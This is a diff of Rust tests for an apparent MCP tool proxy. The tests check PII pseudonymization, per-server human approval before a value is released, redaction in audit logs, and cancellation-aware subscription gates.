+                map.rehydrate("evil-fetch", "⟦EMAIL_1⟧").refused,
+            )
+        });
+        assert!(approved.is_empty(), "the approved server holds the value");
+        assert_eq!(
+            elsewhere,
+            BTreeSet::from(["⟦EMAIL_1⟧".to_string()]),
+            "approving one destination must not release the value to any other"
+        );
+    }
+
+    #[test]
+    fn a_denied_release_refuses_and_grants_nothing() {
+        let env = pii_test_env("pii-release-denied");
+        let _asked = stub_broker(&env.dir, approval::ApprovalDecision::Denied);
+
+        let client = Some("pii-release-denied");
+        with_pii_session(client, |map| {
+            *map = pii::SessionMap::new();
+            map.pseudonymize("crm", "ada@example.com");
+        });
+
+        assert!(
+            rehydrate_for_downstream(
+                client,
+                "mailer",
+                "mailer__send",
+                json!({ "to": "⟦EMAIL_1⟧" })
+            )
+            .is_err(),
+            "a denial refuses the call"
+        );
+        // A denial must leave the map exactly as it was, so the next call re-asks rather
+        // than inheriting a grant nobody gave.
+        let still_refused =
+            with_pii_session(client, |map| map.rehydrate("mailer", "⟦EMAIL_1⟧").refused);
+        assert_eq!(still_refused, BTreeSet::from(["⟦EMAIL_1⟧".to_string()]));
+    }
+
+    #[test]
+    fn all_tokens_substituted_rejects_a_pass_that_left_pseudonyms_behind() {
+        // Defense in depth on the release retry. The grant checks above catch the cases we
+        // can drive deterministically; this guards the residual window where the map moves
+        // between the grant and the retry, which no test can schedule. Pinned directly so
+        // it cannot be quietly weakened.
+        let tokens = BTreeSet::from(["⟦EMAIL_1⟧".to_string(), "⟦PHONE_1⟧".to_string()]);
+        assert!(all_tokens_substituted(
+            &json!({ "to": "ada@example.com", "cc": "+15551234567" }),
+            &tokens
+        ));
+        // Anywhere in the tree counts, and one survivor is enough to refuse.
+        assert!(!all_tokens_substituted(
+            &json!({ "to": "ada@example.com", "body": { "x": ["⟦PHONE_1⟧"] } }),
+            &tokens
+        ));
+        // An empty token set is vacuously satisfied: nothing was refused, nothing to prove.
+        assert!(all_tokens_substituted(
+            &json!({ "to": "⟦EMAIL_9⟧" }),
+            &BTreeSet::new()
+        ));
+    }
+
+    #[test]
+    fn a_map_cleared_during_the_wait_refuses_instead_of_dispatching_literal_tokens() {
+        // The human wait is up to two minutes, and another MCP session can clear the map on
+        // another thread inside it. `pii::rehydrate` reports an unknown token as
+        // resolved-with-nothing rather than as a refusal, so "nothing refused" alone would
+        // wave through arguments that still read `⟦EMAIL_1⟧` — dispatching a request the
+        // user never meant and logging it as an approved release.
+        let env = pii_test_env("pii-release-cleared");
+        let client = Some("pii-release-cleared");
+        with_pii_session(client, |map| {
+            *map = pii::SessionMap::new();
+            map.pseudonymize("crm", "ada@example.com");
+        });
+        let _asked = stub_broker_with(&env.dir, approval::ApprovalDecision::Approved, || {
+            clear_pii_session(Some("pii-release-cleared"));
+        });
+
+        let err = rehydrate_for_downstream(
+            client,
+            "mailer",
+            "mailer__send",
+            json!({ "to": "⟦EMAIL_1⟧" }),
+        )
+        .expect_err("an approval over a vanished value must not dispatch");
+        assert!(err.contains("⟦EMAIL_1⟧"), "name the token: {err}");
+    }
+
+    #[test]
+    fn an_approval_does_not_release_a_value_reminted_during_the_wait() {
+        // The worst shape: the token id survives but now stands for someone else. The human
+        // said yes to ada; granting on the token id alone would hand bob to the mail server.
+        let env = pii_test_env("pii-release-reminted");
+        let client = Some("pii-release-reminted");
+        with_pii_session(client, |map| {
+            *map = pii::SessionMap::new();
+            map.pseudonymize("crm", "ada@example.com");
+        });
+        let _asked = stub_broker_with(&env.dir, approval::ApprovalDecision::Approved, || {
+            // Same token id, different person.
+            with_pii_session(Some("pii-release-reminted"), |map| {
+                *map = pii::SessionMap::new();
+                map.pseudonymize("crm", "bob@example.com");
+            });
+        });
+
+        let err = rehydrate_for_downstream(
+            client,
+            "mailer",
+            "mailer__send",
+            json!({ "to": "⟦EMAIL_1⟧" }),
+        )
+        .expect_err("the approval was for a different value");
+        assert!(
+            !err.contains("bob@example.com") && !err.contains("ada@example.com"),
+            "the refusal must not leak either value: {err}"
+        );
+        // And the re-minted value must NOT have inherited the grant.
+        let refused = with_pii_session(client, |map| map.rehydrate("mailer", "⟦EMAIL_1⟧").refused);
+        assert_eq!(
+            refused,
+            BTreeSet::from(["⟦EMAIL_1⟧".to_string()]),
+            "approving ada must never widen origins for bob"
         );
     }
 
@@ -12501,7 +13131,7 @@ mod tests {
             request_state: Some(json!({ "draft": { "to": "⟦EMAIL_1⟧" } })),
         };
 
-        let out = rehydrate_mrtr_for_downstream(client, "mailer", Some(&mrtr))
+        let out = rehydrate_mrtr_for_downstream(client, "mailer", "mailer__send", Some(&mrtr))
             .expect("the minting server may have its own value back")
             .expect("retry fields were present, so a rewritten copy is expected");
 
@@ -12520,6 +13150,8 @@ mod tests {
 
     #[test]
     fn mrtr_retry_fields_refuse_another_servers_token() {
+        // Same reason as the arguments-path refusal above: this dials the broker now.
+        let _env = pii_test_env("pii-mrtr-cross-server");
         let client = Some("pii-mrtr-cross-server");
         with_pii_session(client, |map| {
             *map = pii::SessionMap::new();
@@ -12530,23 +13162,74 @@ mod tests {
             request_state: None,
         };
 
-        let err = rehydrate_mrtr_for_downstream(client, "mailer", Some(&mrtr))
+        let err = rehydrate_mrtr_for_downstream(client, "mailer", "mailer__send", Some(&mrtr))
             .expect_err("a foreign token in a retry must fail the call too");
 
         assert!(err.contains("⟦EMAIL_1⟧"), "name the token: {err}");
         assert!(!err.contains("ada@example.com"), "must not leak: {err}");
+        // The remedy has to be named here too, or a host answering an elicitation with a
+        // foreign token looks permanently dead-ended even with the desktop app running.
+        assert!(
+            err.contains("Approve the release in the Toolport app"),
+            "point at the release approval: {err}"
+        );
+    }
+
+    #[test]
+    fn a_pii_bearing_downstream_error_is_audited_defended_not_raw() {
+        // SBS-607 threads a `piiReplaced` onto the error path's audit row. That claim sits
+        // beside the `error` field, so auditing the RAW downstream error would put an
+        // address in the append-only log while asserting redaction ran.
+        let mut reg = Registry::default();
+        reg.pii_redaction = true;
+        let client = Some("pii-error-audit");
+        with_pii_session(client, |map| *map = pii::SessionMap::new());
+
+        // The shape execute_call builds for a failed downstream call.
+        let raw = "connect failed for ada@example.com";
+        let defended = defend_and_shape(
+            &reg,
+            "crm",
+            "crm__lookup",
+            client,
+            json!({ "content": [{ "type": "text", "text": raw }], "isError": true }),
+            "",
+            true,
+        );
+        let pass = defended.pii.expect("redaction is on");
+        assert_eq!(pass.replaced, 1, "the error text carried one address");
+
+        let audited = audited_error_text(raw, &defended.result);
+        assert!(
+            !audited.contains("ada@example.com"),
+            "the audited text must be the pseudonymized one: {audited}"
+        );
+        assert!(
+            audited.contains("⟦EMAIL_1⟧"),
+            "and it must still say what failed: {audited}"
+        );
+
+        // A defended body with no text at all still audits a reason rather than nothing.
+        assert_eq!(audited_error_text(raw, &json!({ "content": [] })), raw);
     }
 
     #[test]
     fn absent_mrtr_needs_no_rewritten_copy() {
         let client = Some("pii-mrtr-absent");
-        assert!(rehydrate_mrtr_for_downstream(client, "mailer", None)
-            .expect("no retry fields is not a failure")
-            .is_none());
         assert!(
-            rehydrate_mrtr_for_downstream(client, "mailer", Some(&MrtrRequest::default()))
-                .expect("empty retry fields are not a failure")
-                .is_none(),
+            rehydrate_mrtr_for_downstream(client, "mailer", "mailer__send", None)
+                .expect("no retry fields is not a failure")
+                .is_none()
+        );
+        assert!(
+            rehydrate_mrtr_for_downstream(
+                client,
+                "mailer",
+                "mailer__send",
+                Some(&MrtrRequest::default())
+            )
+            .expect("empty retry fields are not a failure")
+            .is_none(),
             "an empty MrtrRequest must keep the caller on the original borrow"
         );
     }
@@ -12568,19 +13251,97 @@ mod tests {
         let mut result = json!({
             "contents": [{ "type": "text", "text": "owner ada@example.com" }]
         });
-        let replaced = pseudonymize_if_enabled(&reg, client, "my-crm", &mut result);
-        assert_eq!(replaced, 1, "the resource text should have been tokenized");
+        let pass = pseudonymize_if_enabled(&reg, client, "my-crm", &mut result)
+            .expect("redaction is on, so the pass must be reported");
+        assert_eq!(
+            pass.replaced, 1,
+            "the resource text should have been tokenized"
+        );
 
         // Then dispatch the way execute_call does: the sanitized id.
         let sanitized = sanitize_segment("my-crm");
         assert_eq!(sanitized, "my_crm", "guard the premise of this test");
         let args = json!({ "to": "⟦EMAIL_1⟧" });
 
-        let out = rehydrate_for_downstream(client, &sanitized, args)
+        let out = rehydrate_for_downstream(client, &sanitized, "my_crm__send", args)
             .expect("a tool on the same server must get its own value back");
         assert_eq!(
             out["to"], "ada@example.com",
             "resource-minted PII must resolve for a tool on the same server"
+        );
+    }
+
+    #[test]
+    fn defend_and_shape_reports_the_pii_pass_to_the_audit_caller() {
+        // SBS-607: the count is computed deep inside defend_and_shape, but the audit
+        // record is written by its caller, so the pass has to survive the return.
+        let client = Some("pii-audit-pass");
+        let mut reg = Registry::default();
+        let body = |text: &str| json!({ "content": [{ "type": "text", "text": text }] });
+        let rendered = |v: &Value| serde_json::to_string(v).expect("a JSON result");
+
+        // Redaction off reports NO pass. "Not enabled" and "enabled, found nothing" are
+        // different facts, and a zero pass here would make an untouched call read as a
+        // clean redaction.
+        with_pii_session(client, |map| *map = pii::SessionMap::new());
+        let off = defend_and_shape(
+            &reg,
+            "crm",
+            "crm__lookup",
+            client,
+            body("ada@example.com"),
+            "",
+            true,
+        );
+        assert!(
+            off.pii.is_none(),
+            "redaction is off, so no pass is reported"
+        );
+        assert!(
+            rendered(&off.result).contains("ada@example.com"),
+            "guard the premise: with redaction off nothing was rewritten"
+        );
+
+        // On, and the pass fully applied.
+        reg.pii_redaction = true;
+        with_pii_session(client, |map| *map = pii::SessionMap::new());
+        let on = defend_and_shape(
+            &reg,
+            "crm",
+            "crm__lookup",
+            client,
+            body("ada@example.com and bob@example.com"),
+            "",
+            true,
+        );
+        let pass = on.pii.expect("redaction is on, so a pass must be reported");
+        assert_eq!(pass.replaced, 2, "both addresses were tokenized");
+        assert!(pass.complete, "nothing was left in the clear");
+
+        // A full map leaves values in the clear. This path fails OPEN by design, so an
+        // incomplete pass is precisely what the flag exists to surface -- without it the
+        // call is indistinguishable from a clean one.
+        with_pii_session(client, |map| *map = pii::SessionMap::with_capacity(1));
+        let leaky = defend_and_shape(
+            &reg,
+            "crm",
+            "crm__lookup",
+            client,
+            body("ada@example.com and bob@example.com"),
+            "",
+            true,
+        );
+        let pass = leaky
+            .pii
+            .expect("redaction is on, so a pass must be reported");
+        assert_eq!(pass.replaced, 1, "only the first value fit in the map");
+        assert!(
+            !pass.complete,
+            "the second value reached the model in the clear"
+        );
+        assert!(
+            rendered(&leaky.result).contains("bob@example.com"),
+            "guard the premise: the unmapped value really is still in the clear"
         );
     }
 
@@ -12959,7 +13720,8 @@ mod tests {
             "content": [{ "type": "text", "text": payload }],
             "isError": true,
         });
-        let out = defend_and_shape(&reg, "evil-server", "evil__tool", None, result, "", true);
+        let out =
+            defend_and_shape(&reg, "evil-server", "evil__tool", None, result, "", true).result;
         let text = out["content"][0]["text"].as_str().unwrap();
         assert!(
             text.contains("external data"),
@@ -12976,7 +13738,7 @@ mod tests {
             "content": [{ "type": "text", "text": "e".repeat(200_000) }],
             "isError": true,
         });
-        let shaped = defend_and_shape(&reg, "srv", "srv__t", None, huge, "", true);
+        let shaped = defend_and_shape(&reg, "srv", "srv__t", None, huge, "", true).result;
         let shaped_text = shaped["content"][0]["text"].as_str().unwrap();
         assert!(
             shaped_text.len() < 200_000,
@@ -12996,7 +13758,8 @@ mod tests {
             clean,
             "Try list_things first.",
             true,
-        );
+        )
+        .result;
         let blocks = with_hint["content"].as_array().unwrap();
         let trailer = blocks.last().unwrap()["text"].as_str().unwrap();
         assert_eq!(trailer, "Try list_things first.");
@@ -13016,7 +13779,8 @@ mod tests {
         let result = json!({
             "content": [{ "type": "text", "text": payload }],
         });
-        let out = defend_and_shape(&reg, "evil-server", "evil__tool", None, result, "", true);
+        let out =
+            defend_and_shape(&reg, "evil-server", "evil__tool", None, result, "", true).result;
         assert_eq!(out["isError"], true, "blocked call must be isError");
         let text = out["content"][0]["text"].as_str().unwrap();
         assert!(text.contains("blocked"), "security message");
@@ -13035,7 +13799,8 @@ mod tests {
         let result = json!({
             "content": [{ "type": "text", "text": payload }],
         });
-        let out = defend_and_shape(&reg, "evil-server", "evil__tool", None, result, "", true);
+        let out =
+            defend_and_shape(&reg, "evil-server", "evil__tool", None, result, "", true).result;
         assert_ne!(
             out["content"][0]["text"]
                 .as_str()
@@ -13057,7 +13822,8 @@ mod tests {
         let result = json!({
             "content": [{ "type": "text", "text": payload }],
         });
-        let out = defend_and_shape(&reg, "evil-server", "evil__tool", None, result, "", true);
+        let out =
+            defend_and_shape(&reg, "evil-server", "evil__tool", None, result, "", true).result;
         assert!(out["content"][0]["text"]
             .as_str()
             .unwrap()
@@ -13076,7 +13842,8 @@ mod tests {
         let result = json!({
             "content": [{ "type": "text", "text": payload }],
         });
-        let out = defend_and_shape(&reg, "evil-server", "evil__tool", None, result, "", true);
+        let out =
+            defend_and_shape(&reg, "evil-server", "evil__tool", None, result, "", true).result;
         assert_eq!(out["isError"], true);
         assert!(
             out["content"][0]["text"]
@@ -13584,6 +14351,7 @@ mod tests {
             arguments: serde_json::json!({}),
             tool_fingerprint: Some("v2:abc".into()),
             url_elicitation: None,
+            pii_release: None,
         };
         // No endpoint descriptor (Toolport app not running) -> Unreachable (fail-closed),
         // distinct from a human Timeout so the caller can explain *why* it was blocked.
@@ -17698,7 +18466,12 @@ mod tests {
         };
         table2.finish_open_err("file://y", &lead2, "downstream refused".into());
         assert!(table2.sessions_for_uri("file://y").is_empty());
-        assert_eq!(wait_gate.wait().unwrap_err(), "downstream refused");
+        assert_eq!(wait_gate.wait(None).unwrap_err(), "downstream refused");
+        assert_eq!(
+            wait_gate.waiters.load(Ordering::Acquire),
+            0,
+            "a completed gate returns immediately without consuming a waiter slot"
+        );
     }
 
     /// WS1-4: waiters must not park forever when the leader never finishes.
@@ -17709,6 +18482,178 @@ mod tests {
             .wait_for(Duration::from_millis(40))
             .expect_err("must time out");
         assert!(err.contains("timed out"), "got: {err}");
+    }
+
+    #[test]
+    fn open_gate_bounds_concurrent_waiters_per_uri() {
+        let gate = OpenGate::new();
+        let slots = (0..MAX_OPEN_GATE_WAITERS_PER_URI)
+            .map(|_| gate.acquire_waiter().expect("within the waiter limit"))
+            .collect::<Vec<_>>();
+
+        let err = match gate.acquire_waiter() {
+            Ok(_) => panic!("one gate must reject followers beyond its bounded capacity"),
+            Err(err) => err,
+        };
+        assert!(err.contains("too many clients"), "got: {err}");
+
+        drop(slots);
+        assert_eq!(
+            gate.waiters.load(Ordering::Acquire),
+            0,
+            "every exit path must return its waiter slot"
+        );
+    }
+
+    #[test]
+    fn open_gate_stops_waiting_when_the_upstream_request_is_cancelled() {
+        let gate = OpenGate::new();
+        let cancellations = downstream::CancelRegistry::new();
+        let request_id = "resource-sub-waiter".to_string();
+        assert!(cancellations.begin_client_request(request_id.clone()));
+        let cancel = cancellations.context(request_id.clone());
+        let cancel_registry = cancellations.clone();
+        let cancel_id = request_id.clone();
+        let canceller = std::thread::spawn(move || {
+            std::thread::sleep(Duration::from_millis(20));
+            assert!(cancel_registry.cancel(&cancel_id, Some("client deadline elapsed")));
+        });
+
+        let started = Instant::now();
+        let err = gate
+            .wait_for_cancelable(Duration::from_secs(1), Some(&cancel))
+            .expect_err("a cancelled caller must stop waiting");
+        canceller.join().unwrap();
+        assert!(err.contains("cancelled"), "got: {err}");
+        assert!(
+            started.elapsed() < Duration::from_millis(500),
+            "a cancelled request should not park for the one-second leader timeout"
+        );
+        assert_eq!(gate.waiters.load(Ordering::Acquire), 0);
+    }
+
+    #[test]
+    fn open_gate_rejects_an_already_cancelled_waiter_without_taking_a_slot() {
+        let gate = OpenGate::new();
+        let cancellations = downstream::CancelRegistry::new();
+        let request_id = "resource-sub-already-cancelled".to_string();
+        assert!(cancellations.begin_client_request(request_id.clone()));
+        let cancel = cancellations.context(request_id.clone());
+        assert!(cancellations.cancel(&request_id, Some("client went away")));
+
+        let err = gate
+            .wait_for_cancelable(Duration::from_secs(1), Some(&cancel))
+            .expect_err("an already-cancelled caller must not park");
+        assert!(err.contains("cancelled"), "got: {err}");
+        assert_eq!(
+            gate.waiters.load(Ordering::Acquire),
+            0,
+            "an already-cancelled caller must not consume waiter capacity"
+        );
+    }
+
+    #[test]
+    fn open_gate_cancellation_wins_a_completed_leader_race() {
+        let gate = OpenGate::new();
+        let cancellations = downstream::CancelRegistry::new();
+        let request_id = "resource-sub-finish-cancel-race".to_string();
+        assert!(cancellations.begin_client_request(request_id.clone()));
+        let cancel = cancellations.context(request_id.clone());
+        gate.finish(Ok(()));
+        assert!(cancellations.cancel(&request_id, Some("client went away")));
+
+        let err = gate
+            .wait_for_cancelable(Duration::from_secs(1), Some(&cancel))
+            .expect_err("cancellation must win even when the leader just finished");
+        assert!(err.contains("cancelled"), "got: {err}");
+        assert_eq!(gate.waiters.load(Ordering::Acquire), 0);
+    }
+
+    #[test]
+    fn cancelled_modern_registration_rolls_back_earlier_resource_joins() {
+        let state = http_state(false);
+        let router = cache_router();
+        let id = json!(77);
+        let key = modern_subscription_key(None, &id, ModernSubscriptionTransport::Stdio);
+
+        // The first URI is already held by this request. The second is opening for
+        // another session, which forces register_modern_subscription through the
+        // cancellation-aware waiter path after one successful URI.
+        state
+            .resource_subs
+            .lock()
+            .unwrap()
+            .add("anchor", "fixture://cached", "cache")
+            .unwrap();
+        state
+            .resource_subs
+            .lock()
+            .unwrap()
+            .add(&key, "fixture://cached", "cache")
+            .unwrap();
+        let opening = {
+            let mut table = state.resource_subs.lock().unwrap();
+            match table
+                .begin_subscribe("leader", "fixture://waiting", "cache")
+                .unwrap()
+            {
+                BeginSubscribe::Lead(gate) => gate,
+                _ => panic!("fixture must own the opening subscription"),
+            }
+        };
+
+        let cancellations = downstream::CancelRegistry::new();
+        let request_id = "cancelled-listen-request".to_string();
+        assert!(cancellations.begin_client_request(request_id.clone()));
+        let cancel = cancellations.context(request_id.clone());
+        let cancel_registry = cancellations.clone();
+        let cancel_id = request_id.clone();
+        let canceller = std::thread::spawn(move || {
+            std::thread::sleep(Duration::from_millis(20));
+            assert!(cancel_registry.cancel(&cancel_id, Some("client went away")));
+        });
+        let req = modern_req(
+            77,
+            "subscriptions/listen",
+            json!({
+                "notifications": {
+                    "resourceSubscriptions": ["fixture://cached", "fixture://waiting"]
+                }
+            }),
+        );
+
+        let response = match register_modern_subscription(
+            &state,
+            &router,
+            &req,
+            None,
+            Some(&cancel),
+            None,
+            ModernSubscriptionTransport::Stdio,
+        ) {
+            Err(response) => response,
+            Ok(_) => panic!("cancelled registration must fail"),
+        };
+        canceller.join().unwrap();
+        assert!(response["error"]["message"]
+            .as_str()
+            .is_some_and(|message| message.contains("cancelled")));
+        assert!(state.mcp_sessions.lock().unwrap().is_empty());
+        assert_eq!(
+            state
+                .resource_subs
+                .lock()
+                .unwrap()
+                .sessions_for_uri("fixture://cached"),
+            vec!["anchor".to_string()],
+            "the earlier successful URI must be rolled back without disturbing other holders"
+        );
+
+        state.resource_subs.lock().unwrap().finish_open_err(
+            "fixture://waiting",
+            &opening,
+            "fixture cleanup".into(),
+        );
     }
 
     /// WS1-1: mint_mcp_session must release resource subs held by reaped sessions.
